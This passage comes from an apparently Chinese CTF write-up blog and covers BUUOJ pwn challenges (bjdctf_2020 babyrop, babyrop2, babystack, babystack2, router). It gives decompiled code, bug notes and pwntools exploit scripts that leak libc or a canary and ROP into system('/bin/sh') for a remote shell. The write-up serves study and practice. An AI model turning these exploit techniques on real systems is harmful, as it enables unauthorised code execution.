class="number">29429</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,text</span>):</span><br><span class="line">	sh.sendlineafter(<span class="string">&quot;&gt;&gt;&quot;</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line">	sh.sendlineafter(<span class="string">&quot;:&quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">	<span class="keyword">if</span> size &gt; <span class="number">0</span>:</span><br><span class="line">		sh.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">		sh.send(text)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,text</span>):</span><br><span class="line">	sh.sendlineafter(<span class="string">&quot;&gt;&gt;&quot;</span>,<span class="string">&quot;3&quot;</span>)</span><br><span class="line">	sh.sendlineafter(<span class="string">&quot;:&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">	sh.sendafter(<span class="string">&quot;:&quot;</span>,text)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">	sh.sendlineafter(<span class="string">&quot;&gt;&gt;&quot;</span>,<span class="string">&quot;4&quot;</span>)</span><br><span class="line">	sh.sendlineafter(<span class="string">&quot;:&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line"></span><br><span class="line"><span class="comment">#------------------leak------------------</span></span><br><span class="line">	sh.sendafter(<span class="string">&quot;:&quot;</span>,<span class="string">&quot;b&quot;</span> * <span class="number">0x40</span>)</span><br><span class="line">	sh.recvuntil(<span class="string">&quot;b&quot;</span> * <span class="number">0x40</span>)</span><br><span class="line">	heap_base = u32(sh.recv(<span class="number">4</span>)) - <span class="number">8</span></span><br><span class="line">	top_chunk = heap_base + <span class="number">0xd8</span></span><br><span class="line">	log.success(<span class="string">&quot;1st chunk &gt; &quot;</span>+<span class="built_in">hex</span>(heap_base))</span><br><span class="line">	log.success(<span class="string">&quot;top chunk &gt; &quot;</span>+<span class="built_in">hex</span>(top_chunk))</span><br><span class="line"></span><br><span class="line"><span class="comment">#------------------hof------------------</span></span><br><span class="line">	sh.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">	sh.send(<span class="number">0x40</span> * <span class="string">&quot;a&quot;</span>)</span><br><span class="line">	sh.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">	sh.sendline(<span class="string">&quot;\xff&quot;</span> * <span class="number">0x4</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#------------------top chunk------------------</span></span><br><span class="line">	notesize_addr = <span class="number">0x0804B0A0</span></span><br><span class="line">	notelist_addr = <span class="number">0x0804B120</span></span><br><span class="line">	offset = notesize_addr - top_chunk - <span class="number">0x10</span></span><br><span class="line">	add(offset,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#------free@got,atoi@got,atoi@got------</span></span><br><span class="line">	payload = p32(<span class="number">0x400</span>) * <span class="number">10</span></span><br><span class="line">	payload = payload.ljust(<span class="number">0x0804B120</span> - <span class="number">0x0804B0A0</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">	payload += p32(elf.got[<span class="string">&#x27;free&#x27;</span>])</span><br><span class="line">	payload += p32(notesize_addr)</span><br><span class="line">	payload += p32(elf.got[<span class="string">&#x27;__libc_start_main&#x27;</span>])</span><br><span class="line">	add(<span class="number">0x400</span>,payload + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line">	edit(<span class="number">0</span>,p32(elf.plt[<span class="string">&#x27;puts&#x27;</span>]) + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line">	delete(<span class="number">2</span>)</span><br><span class="line"><span class="comment">#------------------leak all------------------</span></span><br><span class="line">	__libc_start_main = u32(sh.recvuntil(<span class="string">&#x27;\xf7&#x27;</span>)[-<span class="number">4</span>:])</span><br><span class="line">	base = __libc_start_main - libc.symbols[<span class="string">&#x27;__libc_start_main&#x27;</span>]</span><br><span class="line">	system = base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">	binsh = base + libc.search(<span class="string">&quot;/bin/sh\x00&quot;</span>).<span class="built_in">next</span>()</span><br><span class="line">	log.success(<span class="string">&#x27;libc base addr: &#x27;</span> + <span class="built_in">hex</span>(base))</span><br><span class="line">	log.success(<span class="string">&#x27;system addr: &#x27;</span> + <span class="built_in">hex</span>(system))</span><br><span class="line">	log.success(<span class="string">&#x27;/bin/sh addr: &#x27;</span> + <span class="built_in">hex</span>(binsh))</span><br><span class="line"></span><br><span class="line"><span class="comment">#------------------attack------------------</span></span><br><span class="line">	edit(<span class="number">0</span>,p32(system) + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line">	edit(<span class="number">1</span>,payload + p32(binsh) + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line">	delete(<span class="number">3</span>)</span><br><span class="line">	sh.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="bjdctf_2020_babyrop"><a class="markdownIt-Anchor" href="#bjdctf_2020_babyrop"></a> bjdctf_2020_babyrop</h2>
<h3 id="1checksec-13"><a class="markdownIt-Anchor" href="#1checksec-13"></a> 1.checksec</h3>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>
<h3 id="2ida-13"><a class="markdownIt-Anchor" href="#2ida-13"></a> 2.IDA</h3>
<p><strong>vuln</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ssize_t</span> <span class="title function_">vuln</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf; <span class="comment">// [rsp+0h] [rbp-20h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Pull up your sword and tell me u story!&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, &amp;buf, <span class="number">0x64</span>uLL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>溢出+libc leak</p>
</blockquote>
<h3 id="3exp-10"><a class="markdownIt-Anchor" href="#3exp-10"></a> 3.EXP</h3>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#from LibcSearcher import *</span></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">p = remote(<span class="string">&quot;node3.buuoj.cn&quot;</span>,<span class="number">29594</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./bjdctf_2020_babyrop&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc-2.23.so&quot;</span>)</span><br><span class="line"></span><br><span class="line">puts_plt = elf.plt[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line">read_got = elf.got[<span class="string">&quot;read&quot;</span>]</span><br><span class="line">main_addr = elf.sym[<span class="string">&quot;main&quot;</span>]</span><br><span class="line">pop_rdi_ret = <span class="number">0x0000000000400733</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;a&quot;</span>*(<span class="number">0x20</span>+<span class="number">8</span>)</span><br><span class="line">payload += p64(pop_rdi_ret)+p64(read_got)</span><br><span class="line">payload += p64(puts_plt)+p64(main_addr)</span><br><span class="line">p.recvuntil(<span class="string">&quot;story!\n&quot;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">leak_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line"><span class="comment">#leak_addr = u64(p.recv(0x6))</span></span><br><span class="line">libc_base = leak_addr-libc.sym[<span class="string">&quot;read&quot;</span>]</span><br><span class="line">sys_addr = libc_base+libc.sym[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">binsh = libc_base+libc.search(<span class="string">&quot;/bin/sh&quot;</span>).<span class="built_in">next</span>()</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">libc = LibcSearcher(&quot;read&quot;,leak_addr)</span></span><br><span class="line"><span class="string">libc_base = leak_addr-libc.dump(&quot;read&quot;)</span></span><br><span class="line"><span class="string">sys_addr = libc_base+libc.dump(&quot;system&quot;)</span></span><br><span class="line"><span class="string">binsh = libc_base+libc.dump(&quot;str_bin_sh&quot;)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">log.info(<span class="string">&quot;libc base=&gt;%x&quot;</span>,libc_base)</span><br><span class="line">log.info(<span class="string">&quot;system addr=&gt;%x&quot;</span>,sys_addr)</span><br><span class="line">log.info(<span class="string">&quot;/bin/sh=&gt;%x&quot;</span>,binsh)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x20</span>+<span class="number">8</span>)</span><br><span class="line">payload += p64(pop_rdi_ret)+p64(binsh)</span><br><span class="line">payload += p64(sys_addr)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;story!&quot;</span>,payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="bjdctf_2020_babyrop2"><a class="markdownIt-Anchor" href="#bjdctf_2020_babyrop2"></a> bjdctf_2020_babyrop2</h2>
<h3 id="1checksec-14"><a class="markdownIt-Anchor" href="#1checksec-14"></a> 1.checksec</h3>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>
<h3 id="2ida-14"><a class="markdownIt-Anchor" href="#2ida-14"></a> 2.IDA</h3>
<p><strong>gift</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">gift</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> format; <span class="comment">// [rsp+0h] [rbp-10h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v2; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;I&#x27;ll give u some gift to help u!&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%6s&quot;</span>, &amp;format);</span><br><span class="line">  <span class="built_in">printf</span>(&amp;format, &amp;format);</span><br><span class="line">  <span class="built_in">puts</span>(byte_400A05);</span><br><span class="line">  fflush(<span class="number">0LL</span>);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>vuln</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">vuln</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf; <span class="comment">// [rsp+0h] [rbp-20h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v2; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Pull up your sword and tell me u story!&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, &amp;buf, <span class="number">0x64</span>uLL);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>从gift利用字符串格式化漏洞泄露canary，再利用vuln执行漏洞</p>
</blockquote>
<h3 id="3exp-11"><a class="markdownIt-Anchor" href="#3exp-11"></a> 3.EXP</h3>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">elf= ELF(<span class="string">&quot;./bjdctf_2020_babyrop2&quot;</span>)</span><br><span class="line"><span class="comment">#p = process(&quot;./bjdctf_2020_babyrop2&quot;)</span></span><br><span class="line">p = remote(<span class="string">&quot;node3.buuoj.cn&quot;</span>,<span class="string">&quot;27381&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;to help u!\n&quot;</span>,<span class="string">&quot;%7$p&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;0x&quot;</span>)</span><br><span class="line">canary=<span class="built_in">int</span>(p.recv(<span class="number">16</span>),<span class="number">16</span>)</span><br><span class="line">success(<span class="string">&quot;Canary=&gt;0x%x&quot;</span>,canary)</span><br><span class="line"></span><br><span class="line">pop_rdi_ret = <span class="number">0x0400993</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x18</span>+p64(canary)+<span class="string">&#x27;a&#x27;</span>*<span class="number">8</span></span><br><span class="line">payload += p64(pop_rdi_ret)+p64(elf.got[<span class="string">&quot;puts&quot;</span>])</span><br><span class="line">payload += p64(elf.plt[<span class="string">&quot;puts&quot;</span>])+p64(elf.sym[<span class="string">&quot;vuln&quot;</span>])</span><br><span class="line">p.sendlineafter(<span class="string">&quot;tell me u story!&quot;</span>,payload)</span><br><span class="line"></span><br><span class="line">leak = u64(p.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">libc = LibcSearcher(<span class="string">&quot;puts&quot;</span>,leak)</span><br><span class="line">base = leak-libc.dump(<span class="string">&quot;puts&quot;</span>)</span><br><span class="line">sys_addr = base + libc.dump(<span class="string">&quot;system&quot;</span>)</span><br><span class="line">binsh = base+ libc.dump(<span class="string">&quot;str_bin_sh&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">0x18</span>+p64(canary)+p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(pop_rdi_ret)+p64(binsh)</span><br><span class="line">payload+=p64(sys_addr)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;!&quot;</span>,payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="bjdctf_2020_babystack"><a class="markdownIt-Anchor" href="#bjdctf_2020_babystack"></a> bjdctf_2020_babystack</h2>
<h3 id="1checksec-15"><a class="markdownIt-Anchor" href="#1checksec-15"></a> 1.checksec</h3>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>
<h3 id="2ida-15"><a class="markdownIt-Anchor" href="#2ida-15"></a> 2.IDA</h3>
<p><strong>main</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf; <span class="comment">// [rsp+0h] [rbp-10h]</span></span><br><span class="line">  <span class="type">size_t</span> nbytes; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>, <span class="number">1</span>, <span class="number">0LL</span>);</span><br><span class="line">  LODWORD(nbytes) = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;**********************************&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;*     Welcome to the BJDCTF!     *&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;* And Welcome to the bin world!  *&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;*  Let&#x27;s try to pwn the world!   *&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;* Please told me u answer loudly!*&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;[+]Are u ready?&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;[+]Please input the length of your name:&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;nbytes);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;[+]What&#x27;s u name?&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, &amp;buf, (<span class="type">unsigned</span> <span class="type">int</span>)nbytes);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>back_door</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">signed</span> __int64 <span class="title function_">backdoor</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>nbytes可以被我们控制，从而造成栈溢出</p>
</blockquote>
<h3 id="3exp-12"><a class="markdownIt-Anchor" href="#3exp-12"></a> 3.EXP</h3>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">p = remote(<span class="string">&quot;node3.buuoj.cn&quot;</span>,<span class="number">25325</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;:&quot;</span>,<span class="built_in">str</span>(<span class="number">0x100</span>))</span><br><span class="line">p.sendlineafter(<span class="string">&quot;?&quot;</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x18</span>+p64(<span class="number">0x04006EA</span>))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="bjdctf_2020_babystack2"><a class="markdownIt-Anchor" href="#bjdctf_2020_babystack2"></a> bjdctf_2020_babystack2</h2>
<h3 id="1checksec-16"><a class="markdownIt-Anchor" href="#1checksec-16"></a> 1.checksec</h3>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>
<h3 id="2ida-16"><a class="markdownIt-Anchor" href="#2ida-16"></a> 2.IDA</h3>
<p><strong>main</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf; <span class="comment">// [rsp+0h] [rbp-10h]</span></span><br><span class="line">  <span class="type">size_t</span> nbytes; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  setvbuf(_bss_start, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>, <span class="number">1</span>, <span class="number">0LL</span>);</span><br><span class="line">  LODWORD(nbytes) = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;**********************************&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;*     Welcome to the BJDCTF!     *&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;* And Welcome to the bin world!  *&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;*  Let&#x27;s try to pwn the world!   *&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;* Please told me u answer loudly!*&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;[+]Are u ready?&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;[+]Please input the length of your name:&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;nbytes);</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">signed</span> <span class="type">int</span>)nbytes &gt; <span class="number">10</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Oops,u name is too long!&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;[+]What&#x27;s u name?&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, &amp;buf, (<span class="type">unsigned</span> <span class="type">int</span>)nbytes);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p><code>(signed int)nbytes </code>为正整数，所以存在整数溢出漏洞</p>
</blockquote>
<p><strong>backdoor</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">signed</span> __int64 <span class="title function_">backdoor</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="3exp-13"><a class="markdownIt-Anchor" href="#3exp-13"></a> 3.EXP</h3>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./bjdctf_2020_babystack2&quot;</span>)</span><br><span class="line"><span class="comment">#p = process(&quot;./bjdctf_2020_babystack2&quot;)</span></span><br><span class="line">p = remote(<span class="string">&quot;node3.buuoj.cn&quot;</span>,<span class="string">&quot;28949&quot;</span>)</span><br><span class="line"></span><br><span class="line">back_door = <span class="number">0x0400726</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x18</span>+p64(back_door)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;:\n&quot;</span>,<span class="string">&#x27;-1&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;?\n&quot;</span>,payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="bjdctf_2020_router"><a class="markdownIt-Anchor" href="#bjdctf_2020_router"></a> bjdctf_2020_router</h2>
<h3 id="1checksec-17"><a class="markdownIt-Anchor" href="#1checksec-17"></a> 1.checksec</h3>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>
<h3 id="2运行"><a class="markdownIt-Anchor" href="#2运行"></a> 2.运行</h3>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Welcome to BJDCTF router test program!</span><br><span class="line">1.ping</span><br><span class="line">2.test</span><br><span class="line">3.leave comments</span><br><span class="line">4.root</span><br><span class="line">5.exit</span><br><span class="line">Please input u choose:</span><br></pre></td></tr></table></figure>
<blockquote>
<p>根本不用EXP，考察的是linux的 命令是利用<code>;</code>分割的</p>
</blockquote>
<h3 id="3exp-14"><a class="markdownIt-Anchor" href="#3exp-14"></a> 3.EXP</h3>
